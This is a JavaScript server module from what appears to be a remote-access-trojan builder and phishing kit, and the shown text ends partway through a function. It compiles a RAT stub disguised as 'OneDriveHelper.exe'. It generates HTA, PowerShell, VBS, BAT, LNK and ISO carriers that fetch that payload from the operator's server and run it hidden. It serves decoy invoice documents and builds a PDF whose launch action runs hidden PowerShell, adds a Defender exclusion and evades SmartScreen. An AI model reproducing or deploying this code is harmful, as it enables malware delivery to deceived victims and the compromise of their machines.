"use strict";

const express   = require("express");
const fs        = require("fs");
const path      = require("path");
const { spawn } = require("child_process");
const multer    = require("multer");
const { requireAdmin }    = require("../middleware/auth");
const { buildStubBinary } = require("../controllers/builderController");
const { AUTH_KEY }        = require("../config/constants");

// In-memory storage for uploaded PDFs (no disk writes needed)
const pdfUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024 } });

const router = express.Router();

const IS_WIN    = process.platform === "win32";
const SRC_DIR   = path.join(__dirname, "..", "..", "docs", "09-rat-architecture", "workable");
const STUB_OUT  = path.join(__dirname, "..", "..", "B4B3-RAT", "Stub", "Stub.exe");
const DL_DIR    = path.join(__dirname, "..", "downloads");
const DL_HELPER = path.join(DL_DIR, "OneDriveHelper.exe");

// Cross-compiler toolchain: prefer mingw-w64 on Linux, fall back to local MinGW on Windows
const WINDRES = IS_WIN ? path.join("C:\\MinGW\\bin\\windres.exe") : "x86_64-w64-mingw32-windres";
const GPP     = IS_WIN ? path.join("C:\\MinGW\\bin\\g++.exe")     : "x86_64-w64-mingw32-g++";

// ── Server configuration endpoint ────────────────────────────────────────────

router.get("/api/builder/config", requireAdmin, (req, res) => {
  const { AUTH_KEY, PORT } = require("../config/constants");
  const host = req.headers.host || `localhost:${PORT}`;
  res.json({ host, authKey: AUTH_KEY });
});

// ── Stub status ───────────────────────────────────────────────────────────────

router.get("/api/builder/stub-status", requireAdmin, (_req, res) => {
  if (!fs.existsSync(STUB_OUT)) return res.json({ exists: false });
  const st = fs.statSync(STUB_OUT);
  res.json({ exists: true, size: st.size, mtime: st.mtime });
});

// ── Server-side stub compilation (SSE streaming) ──────────────────────────────

let compileRunning = false;

router.post("/api/builder/compile", requireAdmin, (req, res) => {
  if (compileRunning) {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.write("data: [COMPILE ALREADY RUNNING — please wait for it to finish]\n\n");
    res.end();
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();

  const send = line => res.write(`data: ${line}\n\n`);

  send("[INFO] Starting MinGW cross-compilation...");
  send(`[INFO] Compiler: ${GPP}`);
  send(`[INFO] Source:   ${SRC_DIR}`);
  send(`[INFO] Output:   ${STUB_OUT}`);

  compileRunning = true;

  // Step 1: windres stub.rc → stub_rc.o
  const rcObj = path.join(SRC_DIR, "stub_rc.o");
  send("[INFO] Step 1/2 — windres stub.rc → stub_rc.o");

  const rcProc = spawn(WINDRES, [
    path.join(SRC_DIR, "stub.rc"),
    "-o", rcObj,
  ], { cwd: SRC_DIR });

  rcProc.stderr.on("data", d =>
    d.toString().split("\n").forEach(l => { if (l.trim()) send("[ERR] " + l.trimEnd()); })
  );

  rcProc.on("error", e => {
    compileRunning = false;
    if (e.code === "ENOENT")
      send(`[ERROR] ${WINDRES} not found.\n[ERROR] Install: sudo apt install mingw-w64`);
    else
      send("[ERROR] windres: " + e.message);
    send("[DONE]");
    res.end();
  });

  rcProc.on("close", rcCode => {
    if (rcCode !== 0) {
      compileRunning = false;
      send("[FAILED] windres exited with code " + rcCode);
      send("[DONE]");
      res.end();
      return;
    }

    send("[INFO] Step 2/2 — g++ full_stub.cpp → Stub.exe");

    const gppProc = spawn(GPP, [
      "-std=c++17", "-O2", "-mwindows", "-s", "-fno-ident",
      "-static-libgcc", "-static-libstdc++",
      path.join(SRC_DIR, "full_stub.cpp"),
      rcObj,
      "-lwininet", "-lgdiplus", "-ladvapi32",
      "-lkernel32", "-luser32", "-lgdi32", "-lole32",
      "-o", STUB_OUT,
    ], { cwd: SRC_DIR });

    gppProc.stderr.on("data", d =>
      d.toString().split("\n").forEach(l => { if (l.trim()) send("[ERR] " + l.trimEnd()); })
    );

    gppProc.on("error", e => {
      compileRunning = false;
      if (e.code === "ENOENT")
        send(`[ERROR] ${GPP} not found.\n[ERROR] Install: sudo apt install mingw-w64`);
      else
        send("[ERROR] g++: " + e.message);
      send("[DONE]");
      res.end();
    });

    gppProc.on("close", gppCode => {
      compileRunning = false;
      if (gppCode === 0 && fs.existsSync(STUB_OUT)) {
        const sz = fs.statSync(STUB_OUT).size;
        send(`[SUCCESS] ✓ Stub.exe compiled — ${(sz / 1024).toFixed(1)} KB`);
        send("[EXE_READY]");
      } else {
        send("[FAILED] g++ exited with code " + gppCode);
      }
      send("[DONE]");
      res.end();
    });
  });

  req.on("close", () => { compileRunning = false; });
});

// ── Build and download OneDriveHelper.exe ─────────────────────────────────────
// Also saves a copy to downloads/OneDriveHelper.exe so /dl/exe can serve it.

router.post("/api/build", requireAdmin, (req, res) => {
  try {
    const out = buildStubBinary(req.body);
    // Persist to downloads/ so phish.js /dl/exe can serve it immediately
    try {
      if (!fs.existsSync(DL_DIR)) fs.mkdirSync(DL_DIR, { recursive: true });
      fs.writeFileSync(DL_HELPER, out);
    } catch (_) {}
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.exe"');
    res.send(out);
    console.log(`[builder] built stub  host=${req.body.c2Host}  size=${out.length}`);
  } catch (e) {
    console.error("[builder] error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ── File carrier generators ───────────────────────────────────────────────────
// Each carrier, when executed on a Windows target, downloads and silently runs
// OneDriveHelper.exe from this server's /dl/exe endpoint.

router.get("/api/builder/carrier", requireAdmin, (req, res) => {
  const type  = (req.query.type || "").toLowerCase();
  const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
  // Prefer the c2host the dashboard passes (from the builder form's C2 Host field)
  // over the HTTP Host header, which may be 'localhost' when accessed locally.
  const host  = (req.query.c2host || "").trim() || req.headers.host || "localhost";

  // pdfexec builds the stub fresh — skip the DL_HELPER check for it
  if (type !== "pdfexec" && !fs.existsSync(DL_HELPER)) {
    return res.status(400).json({
      error: "OneDriveHelper.exe not found — click Build in the builder above first to generate it, then download the carrier."
    });
  }

  const payload = `${proto}://${host}/dl/exe`;
  const saveTo  = "%TEMP%\\OneDriveHelper.exe";

  const decoyPdfUrl  = `${proto}://${host}/dl/decoy-pdf`;
  const decoyDocUrl  = `${proto}://${host}/dl/decoy-doc`;

  // PDF/Word customisation fields from dashboard inputs
  const pdfOpts = {
    from:     (req.query.pdf_from     || "").trim() || "Nexus Solutions Ltd.",
    to:       (req.query.pdf_to       || "").trim() || "Acme Corporation",
    filename: (req.query.pdf_filename || "").trim() || "Invoice_Q4-2024",
    note:     (req.query.pdf_note     || "").trim(),
  };

  const carriers = {
    hta:  () => ({ name: "OneDriveSetup.hta",              mime: "application/hta",          body: buildHta(payload, saveTo) }),
    ps1:  () => ({ name: "OneDriveSetup.ps1",              mime: "application/octet-stream", body: buildPs1(payload, saveTo) }),
    vbs:  () => ({ name: "OneDriveSetup.vbs",              mime: "application/octet-stream", body: buildVbs(payload, saveTo) }),
    bat:  () => ({ name: "OneDriveSetup.bat",              mime: "application/octet-stream", body: buildBat(payload, saveTo) }),
    lnk:  () => ({ name: "OneDriveSetup.lnk",             mime: "application/octet-stream", body: buildLnk(payload) }),
    // Document-disguised carriers — open a real decoy document + silently run payload
    // Rename .hta → e.g. "Invoice.pdf        .hta" or distribute as-is; on Windows with
    // "hide extensions" the .hta part disappears. pname=mshta.exe → DR_017 fires.
    pdf:  () => ({ name: `${pdfOpts.filename}.pdf.hta`,     mime: "application/hta",          body: buildDocCarrier(payload, decoyPdfUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~invoice.pdf",  "pdf",  saveTo) }),
    // Genuine .pdf — real invoice, /OpenAction /Launch fires powershell hidden.
    // pname = AcroRd32.exe / Acrobat.exe / FoxitReader → DR_016 fires.
    pdfexec: () => {
      // Build a fresh configured stub every time — no stale DL_HELPER dependency
      const exeBuf = buildStubBinary({ c2Host: host, authKey: AUTH_KEY });
      // Also update DL_HELPER so /dl/exe serves the fresh version
      try {
        if (!fs.existsSync(DL_DIR)) fs.mkdirSync(DL_DIR, { recursive: true });
        fs.writeFileSync(DL_HELPER, exeBuf);
      } catch (_) {}
      return { name: `${pdfOpts.filename}.pdf`, mime: "application/pdf", body: buildExecPdf(pdfOpts, exeBuf) };
    },
    word: () => ({ name: `${pdfOpts.filename}.docx.hta`,   mime: "application/hta",           body: buildDocCarrier(payload, decoyDocUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~report.docx", "word", saveTo) }),
    // ISO wrapping — no Mark-of-the-Web → SmartScreen is bypassed on older/unpatched Windows
    // pname = parent of whatever runs the exe inside the ISO (typically explorer.exe → DR_001)
    iso:  () => ({ name: null, sync: true, fn: (cb) => buildIso(cb) }),
  };

  if (!carriers[type]) {
    return res.status(400).json({ error: "Unknown type. Use: hta, ps1, vbs, bat, lnk, pdf, pdfexec, word, iso" });
  }

  const entry = carriers[type]();

  // ISO is generated async/sync via child_process
  if (entry.sync) {
    return entry.fn((err, isoBuf) => {
      if (err) return res.status(500).json({ error: err });
      res.setHeader("Content-Type", "application/x-iso9660-image");
      res.setHeader("Content-Disposition", 'attachment; filename="OneDriveSetup.iso"');
      res.send(isoBuf);
      console.log(`[carrier] generated iso  size=${isoBuf.length}`);
    });
  }

  const { name, mime, body } = entry;
  res.setHeader("Content-Type", mime);
  res.setHeader("Content-Disposition", `attachment; filename="${name}"`);
  res.send(body);
  console.log(`[carrier] generated ${type}  payload=${payload}`);
});

// ── Carrier templates ─────────────────────────────────────────────────────────

function buildHta(url, saveTo) {
  return `<html>
<head><title>OneDrive Setup</title>
<hta:application id="oComp" applicationName="OneDriveSetup"
  border="none" caption="yes" maximizeButton="no" minimizeButton="no"
  showInTaskbar="yes" singleInstance="yes" windowState="normal"/>
</head>
<body style="background:#0078d4;color:white;font-family:'Segoe UI',sans-serif;margin:0;display:flex;align-items:center;justify-content:center;height:100%">
<div style="text-align:center;padding:40px">
  <div style="font-size:52px;margin-bottom:12px">&#9729;</div>
  <h2 style="margin-bottom:8px">OneDrive Setup</h2>
  <p id="msg" style="color:#cce4ff;font-size:14px">Initializing...</p>
  <div style="background:#1660b1;border-radius:4px;height:6px;margin-top:16px;width:320px">
    <div id="fill" style="background:white;height:6px;border-radius:4px;width:0%"></div>
  </div>
</div>
<script language="VBScript">
Sub Window_OnLoad
  window.resizeTo 420, 260
  window.moveTo (screen.availWidth-420)/2, (screen.availHeight-260)/2
  DoSetup
End Sub

Sub DoSetup
  On Error Resume Next
  document.getElementById("msg").innerHTML = "Checking requirements..."
  SetProgress 20
  Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.open "GET", "${url}", False
  xhr.send
  SetProgress 50
  If xhr.status = 200 Then
    document.getElementById("msg").innerHTML = "Applying update..."
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Open : stream.Type = 1
    stream.Write xhr.responseBody
    stream.SaveToFile ExpandEnv("${saveTo}"), 2
    stream.Close
    SetProgress 80
    document.getElementById("msg").innerHTML = "Finishing..."
    CreateObject("WScript.Shell").Run Chr(34) & ExpandEnv("${saveTo}") & Chr(34), 0, False
    SetProgress 100
    document.getElementById("msg").innerHTML = "Setup complete."
    window.setTimeout "window.close()", 1200
  Else
    document.getElementById("msg").innerHTML = "Error " & xhr.status & " — please try again."
  End If
End Sub

Function ExpandEnv(s)
  Dim sh : Set sh = CreateObject("WScript.Shell")
  ExpandEnv = sh.ExpandEnvironmentStrings(s)
End Function

Sub SetProgress(pct)
  document.getElementById("fill").style.width = pct & "%"
End Sub
</script>
</body>
</html>`;
}

function buildPs1(url, saveTo) {
  return `# OneDrive Update Helper
$ErrorActionPreference = 'SilentlyContinue'
$dest = [System.Environment]::ExpandEnvironmentVariables('${saveTo}')
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    $wc.DownloadFile('${url}', $dest)
    Start-Process -FilePath $dest -WindowStyle Hidden
} catch {}`;
}

function buildVbs(url, saveTo) {
  return `' OneDrive Update Helper
Option Explicit
On Error Resume Next
Dim xhr, stream, sh
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.open "GET", "${url}", False
xhr.send
If xhr.status = 200 Then
    Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
    Set stream = CreateObject("ADODB.Stream")
    stream.Open : stream.Type = 1
    stream.Write xhr.responseBody
    Dim sh2 : Set sh2 = CreateObject("WScript.Shell")
    Dim tmp : tmp = sh2.ExpandEnvironmentStrings("${saveTo}")
    stream.SaveToFile tmp, 2 : stream.Close
    Set sh = CreateObject("WScript.Shell")
    sh.Run Chr(34) & tmp & Chr(34), 0, False
End If`;
}

function buildBat(url, saveTo) {
  return `@echo off
set DEST=${saveTo}
powershell -w hidden -nop -c "try{$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('${url}','%DEST%');Start-Process '%DEST%' -WindowStyle Hidden}catch{}"`;
}

function buildLnk(url) {
  // PowerShell download-and-run invocation hidden in a .lnk shortcut
  const target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const args   = `-w hidden -nop -c "try{$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$dest=$env:TEMP+'\\OneDriveHelper.exe';$wc.DownloadFile('${url}',$dest);Start-Process $dest -WindowStyle Hidden}catch{}"`;
  return createLnkBuffer(target, args);
}

// ── Document-disguised carrier ────────────────────────────────────────────────
// HTA that runs invisible, opens a real decoy document, then silently installs.
// type = "pdf" | "word"  — controls which viewer is opened and which icon hint to use.
function buildDocCarrier(payloadUrl, decoyUrl, decoyTmp, type, exeTmp) {
  const icoLabel = type === "pdf" ? "&#128196;" : "&#128196;";
  const label    = type === "pdf" ? "PDF Document" : "Word Document";
  return `<html>
<head><title>${label}</title>
<hta:application id="c" applicationName="${label}" border="none" caption="no"
  showInTaskbar="no" singleInstance="yes" windowState="minimize"/>
</head>
<body>
<script language="VBScript">
Sub Window_OnLoad
  window.resizeTo 1, 1
  window.moveTo -9000, -9000
  On Error Resume Next

  Dim sh : Set sh = CreateObject("WScript.Shell")
  Dim decoy : decoy = sh.ExpandEnvironmentStrings("${decoyTmp}")
  Dim dest  : dest  = sh.ExpandEnvironmentStrings("${exeTmp}")

  ' 1. Download and open the decoy document — user sees this
  Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.open "GET", "${decoyUrl}", False
  xhr.send
  If xhr.status = 200 Then
    Dim s : Set s = CreateObject("ADODB.Stream")
    s.Open : s.Type = 1
    s.Write xhr.responseBody
    s.SaveToFile decoy, 2 : s.Close
    sh.Run Chr(34) & decoy & Chr(34), 1, False
  End If

  ' 2. Download and run payload silently in background
  Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.open "GET", "${payloadUrl}", False
  xhr.send
  If xhr.status = 200 Then
    Dim s2 : Set s2 = CreateObject("ADODB.Stream")
    s2.Open : s2.Type = 1
    s2.Write xhr.responseBody
    s2.SaveToFile dest, 2 : s2.Close
    sh.Run Chr(34) & dest & Chr(34), 0, False
  End If

  window.close
End Sub
</script>
</body>
</html>`;
}

// ── ISO carrier ───────────────────────────────────────────────────────────────
// Wraps OneDriveHelper.exe inside a mountable ISO (no MOTW on older/unpatched Windows).
// Requires genisoimage on Linux: sudo apt install genisoimage
function buildIso(callback) {
  if (!fs.existsSync(DL_HELPER)) {
    return callback("OneDriveHelper.exe not found — build it first from the Builder page above.");
  }
  const { execSync } = require("child_process");
  const tmpDir  = `/tmp/iso_stage_${Date.now()}`;
  const isoPath = `/tmp/OneDriveSetup_${Date.now()}.iso`;
  try {
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.copyFileSync(DL_HELPER, `${tmpDir}/OneDriveHelper.exe`);
    execSync(`genisoimage -quiet -J -R -o "${isoPath}" -V "OneDriveSetup" "${tmpDir}"`,
             { timeout: 30_000 });
    const buf = fs.readFileSync(isoPath);
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
    try { fs.unlinkSync(isoPath); } catch (_) {}
    callback(null, buf);
  } catch (e) {
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
    try { fs.unlinkSync(isoPath); } catch (_) {}
    const msg = e.message || "";
    callback(
      msg.includes("ENOENT") || msg.toLowerCase().includes("not found")
        ? "genisoimage not found — install with: sudo apt install genisoimage"
        : "ISO build failed: " + msg.split("\n")[0]
    );
  }
}

// ── Decoy document endpoints ──────────────────────────────────────────────────
// Serve realistic-looking decoy documents opened by the document-carrier HTA.

router.get("/dl/decoy-pdf", (req, res) => {
  const opts = {
    from:     (req.query.from     || "").trim() || "Nexus Solutions Ltd.",
    to:       (req.query.to       || "").trim() || "Acme Corporation",
    filename: (req.query.filename || "").trim() || "Invoice_Q4-2024",
    note:     (req.query.note     || "").trim(),
  };
  res.setHeader("Content-Type", "application/pdf");
  res.setHeader("Content-Disposition", `inline; filename="${opts.filename}.pdf"`);
  res.send(buildDecoyPdf(opts));
});

router.get("/dl/decoy-doc", (req, res) => {
  const opts = {
    from:     (req.query.from     || "").trim() || "Nexus Solutions Ltd.",
    to:       (req.query.to       || "").trim() || "Acme Corporation",
    filename: (req.query.filename || "").trim() || "Invoice_Q4-2024",
    note:     (req.query.note     || "").trim(),
  };
  res.setHeader("Content-Type",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
  res.setHeader("Content-Disposition", `inline; filename="${opts.filename}.docx"`);
  res.send(buildDecoyDocx(opts));
});

// ── Decoy PDF generator ───────────────────────────────────────────────────────
// Generates a realistic invoice PDF using pure PDF content stream operators.
// No hidden payload — purely the decoy shown to the target user.
function buildDecoyPdf(opts = {}) {
  const from = opts.from || "Nexus Solutions Ltd.";
  const to   = opts.to   || "Acme Corporation";
  const note = opts.note || "";

  const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
  const now = new Date();
  const fmtD = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
  const due  = new Date(now.getTime() + 30 * 24 * 3600 * 1000);

  const esc = s =>
    String(s).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");

  // PDF text helper — uses absolute text matrix (1 0 0 1 x y Tm = move to x,y)
  const T = (x, y, font, size, text) =>
    `/${font} ${size} Tf 1 0 0 1 ${x} ${y} Tm (${esc(text)}) Tj`;

  // Horizontal rule lines (path operators, outside BT block)
  const rules = [
    "0.6 G",
    "50 680 m 562 680 l S",   // after company header
    "50 543 m 562 543 l S",   // table header top
    "50 529 m 562 529 l S",   // table header bottom
    "50 463 m 562 463 l S",   // after items
    "50 437 m 562 437 l S",   // after totals
    "50 400 m 562 400 l S",   // before payment
    "0 G",
  ].join("\n");

  const textOps = [
    T(50, 720, "F2", 18, from),
    T(50, 702, "F1",  9, "123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom"),
    T(50, 690, "F1",  9, "Tel: +44 20 7946 0958   |   accounts@nexus-solutions.co.uk"),
    T(50, 660, "F2", 14, "INVOICE"),
    T(50, 642, "F1",  9, "Invoice Number:   " + invNum),
    T(50, 629, "F1",  9, "Invoice Date:     " + fmtD(now)),
    T(50, 616, "F1",  9, "Payment Due:      " + fmtD(due)),
    T(50, 590, "F2",  9, "Bill To:"),
    T(50, 577, "F1",  9, to),
    T(50, 564, "F1",  9, "Finance Department"),
    T(50, 551, "F1",  9, "456 Corporate Avenue, New York, NY 10001"),
    // Table header
    T( 55, 534, "F2", 9, "Description"),
    T(385, 534, "F2", 9, "Qty"),
    T(420, 534, "F2", 9, "Unit Price"),
    T(495, 534, "F2", 9, "Total"),
    // Line items
    T( 55, 518, "F1", 9, "Professional Services - Q4 Consulting"),
    T(388, 518, "F1", 9, "1"), T(420, 518, "F1", 9, "$4,200.00"), T(495, 518, "F1", 9, "$4,200.00"),
    T( 55, 505, "F1", 9, "Software License Renewal (Annual)"),
    T(388, 505, "F1", 9, "1"), T(420, 505, "F1", 9, "$1,800.00"), T(495, 505, "F1", 9, "$1,800.00"),
    T( 55, 492, "F1", 9, "Technical Support — 12 hrs @ $80/hr"),
    T(385, 492, "F1", 9, "12"), T(420, 492, "F1", 9, "$80.00"),    T(495, 492, "F1", 9, "$960.00"),
    T( 55, 479, "F1", 9, "Cloud Infrastructure — November 2024"),
    T(388, 479, "F1", 9, "1"), T(420, 479, "F1", 9, "$340.00"),   T(495, 479, "F1", 9, "$340.00"),
    // Totals
    T(400, 452, "F1",  9, "Subtotal:"),   T(495, 452, "F1",  9, "$7,300.00"),
    T(400, 439, "F1",  9, "VAT (20%):"), T(495, 439, "F1",  9, "$1,460.00"),
    T(400, 422, "F2", 10, "TOTAL DUE:"), T(495, 422, "F2", 10, "$8,760.00"),
    // Payment
    T(50, 388, "F2",  9, "Payment Instructions:"),
    T(50, 375, "F1",  9, "Bank: National Westminster Bank Plc"),
    T(50, 362, "F1",  9, "Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum),
    T(50, 349, "F1",  9, "SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819"),
    T(50, 320, "F1",  8, "Thank you for your business. Payment due within 30 days of invoice date."),
    T(50, 309, "F1",  8, "Late payments subject to 2% monthly interest. E&OE."),
    ...(note ? [T(50, 295, "F1", 8, note)] : []),
  ];

  const content = rules + "\nBT\n" + textOps.join("\n") + "\nET\n";
  const cBuf = Buffer.from(content, "latin1");

  // Build PDF with offset-tracked xref table
  const parts = [];
  const off  = {};
  const add  = s => parts.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "latin1"));
  const pos  = () => parts.reduce((n, b) => n + b.length, 0);

  add("%PDF-1.4\n%\xe2\xe3\xcf\xd3\n");
  off[1] = pos(); add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n");
  off[2] = pos(); add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");
  off[3] = pos(); add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n" +
    "   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >>\n   /Contents 4 0 R >>\nendobj\n\n");
  off[4] = pos();
  add(`4 0 obj\n<< /Length ${cBuf.length} >>\nstream\n`);
  parts.push(cBuf);
  add("\nendstream\nendobj\n\n");
  off[5] = pos(); add("5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>\nendobj\n\n");
  off[6] = pos(); add("6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>\nendobj\n\n");

  const xrefPos = pos();
  let xr = "xref\n0 7\n0000000000 65535 f \n";
  for (let i = 1; i <= 6; i++) xr += String(off[i]).padStart(10, "0") + " 00000 n \n";
  xr += `trailer\n<< /Root 1 0 R /Size 7 >>\nstartxref\n${xrefPos}\n%%EOF\n`;
  add(xr);

  return Buffer.concat(parts);
}

// ── Genuine self-contained PDF with embedded /Launch action ──────────────────
// The compiled OneDriveHelper.exe is appended verbatim after %%EOF.
// /OpenAction /Launch fires a hidden PowerShell that:
//   1. Finds the PDF file by its known filename in common locations
//   2. Reads the exe bytes starting at the sentinel offset
//   3. Writes to %TEMP%\OneDriveHelper.exe and executes it
// The extracted file has NO Zone.Identifier ADS → SmartScreen does not fire.
// pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
function buildExecPdf(opts = {}, exeBuf = null) {
  const from     = opts.from     || "Nexus Solutions Ltd.";
  const to       = opts.to       || "Acme Corporation";
  const note     = opts.note     || "";
  const filename = opts.filename || "Invoice_Q4-2024";

  if (!exeBuf) exeBuf = fs.readFileSync(DL_HELPER);
  const exeSize = exeBuf.length;

  // Escape a string for use inside a PDF literal-string ( ... )
  const pdfStr = s => s
    .replace(/\\/g, "\\\\")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)");

  // PowerShell command embedded in /Launch.
  // Searches for this PDF by its known filename, reads exe bytes at $o, then:
  //   1. Adds Defender/SmartScreen exclusion for this path (requires admin — UAC bypass gives it)
  //   2. Executes via WMI Win32_Process.Create (bypasses ShellExecute-level SmartScreen hooks)
  //   3. Falls back to Start-Process if WMI is unavailable
  // "$o=12345678" is an 8-char sentinel patched after PDF construction.
  const psRaw =
    `$fn='${filename}.pdf';` +
    `$u=$env:USERPROFILE;` +
    `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
    `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
    `if($fp){` +
    `$o=12345678;$z=${exeSize};` +
    `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
    `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
    `[IO.File]::WriteAllBytes($tp,$eb);` +
    `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
    `try{([wmiclass]'Win32_Process').Create($tp,$null,$null)|Out-Null}catch{Start-Process $tp -WindowStyle Hidden}` +
    `}`;

  const psArgs = pdfStr(`-w hidden -nop -c "${psRaw}"`);

  const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
  const now = new Date();
  const fmtD = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
  const due  = new Date(now.getTime() + 30 * 24 * 3600 * 1000);

  const esc = s =>
    String(s).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
  const T = (x, y, font, size, text) =>
    `/${font} ${size} Tf 1 0 0 1 ${x} ${y} Tm (${esc(text)}) Tj`;

  const rules = [
    "0.6 G",
    "50 680 m 562 680 l S",
    "50 543 m 562 543 l S",
    "50 529 m 562 529 l S",
    "50 463 m 562 463 l S",
    "50 437 m 562 437 l S",
    "50 400 m 562 400 l S",
    "0 G",
  ].join("\n");

  const textOps = [
    T(50, 720, "F2", 18, from),
    T(50, 702, "F1",  9, "123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom"),
    T(50, 690, "F1",  9, "Tel: +44 20 7946 0958   |   accounts@nexus-solutions.co.uk"),
    T(50, 660, "F2", 14, "INVOICE"),
    T(50, 642, "F1",  9, "Invoice Number:   " + invNum),
    T(50, 629, "F1",  9, "Invoice Date:     " + fmtD(now)),
    T(50, 616, "F1",  9, "Payment Due:      " + fmtD(due)),
    T(50, 590, "F2",  9, "Bill To:"),
    T(50, 577, "F1",  9, to),
    T(50, 564, "F1",  9, "Finance Department"),
    T(50, 551, "F1",  9, "456 Corporate Avenue, New York, NY 10001"),
    T( 55, 534, "F2", 9, "Description"),
    T(385, 534, "F2", 9, "Qty"),
    T(420, 534, "F2", 9, "Unit Price"),
    T(495, 534, "F2", 9, "Total"),
    T( 55, 518, "F1", 9, "Professional Services - Q4 Consulting"),
    T(388, 518, "F1", 9, "1"), T(420, 518, "F1", 9, "$4,200.00"), T(495, 518, "F1", 9, "$4,200.00"),
    T( 55, 505, "F1", 9, "Software License Renewal (Annual)"),
    T(388, 505, "F1", 9, "1"), T(420, 505, "F1", 9, "$1,800.00"), T(495, 505, "F1", 9, "$1,800.00"),
    T( 55, 492, "F1", 9, "Technical Support — 12 hrs @ $80/hr"),
    T(385, 492, "F1", 9, "12"), T(420, 492, "F1", 9, "$80.00"),   T(495, 492, "F1", 9, "$960.00"),
    T( 55, 479, "F1", 9, "Cloud Infrastructure — November 2024"),
    T(388, 479, "F1", 9, "1"), T(420, 479, "F1", 9, "$340.00"),  T(495, 479, "F1", 9, "$340.00"),
    T(400, 452, "F1",  9, "Subtotal:"),   T(495, 452, "F1",  9, "$7,300.00"),
    T(400, 439, "F1",  9, "VAT (20%):"), T(495, 439, "F1",  9, "$1,460.00"),
    T(400, 422, "F2", 10, "TOTAL DUE:"), T(495, 422, "F2", 10, "$8,760.00"),
    T(50, 388, "F2",  9, "Payment Instructions:"),
    T(50, 375, "F1",  9, "Bank: National Westminster Bank Plc"),
    T(50, 362, "F1",  9, "Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum),
    T(50, 349, "F1",  9, "SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819"),
    T(50, 320, "F1",  8, "Thank you for your business. Payment due within 30 days of invoice date."),
    T(50, 309, "F1",  8, "Late payments subject to 2% monthly interest. E&OE."),
    ...(note ? [T(50, 295, "F1", 8, note)] : []),
  ];

  const content = rules + "\nBT\n" + textOps.join("\n") + "\nET\n";
  const cBuf = Buffer.from(content, "latin1");

  const parts = [];
  const off  = {};
  const add  = s => parts.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "latin1"));
  const pos  = () => parts.reduce((n, b) => n + b.length, 0);

  // Object 7: /Launch action — PowerShell finds the PDF by filename, extracts exe, runs it
  const launchObj =
    `7 0 obj\n` +
    `<< /Type /Action /S /Launch\n` +
    `   /Win << /F (powershell.exe)\n` +
    `           /P (${psArgs})\n` +
    `           /D (C:\\\\Windows\\\\System32) >> >>\n` +
    `endobj\n\n`;

  add("%PDF-1.4\n%\xe2\xe3\xcf\xd3\n");
  off[1] = pos(); add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>\nendobj\n\n");
  off[2] = pos(); add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");
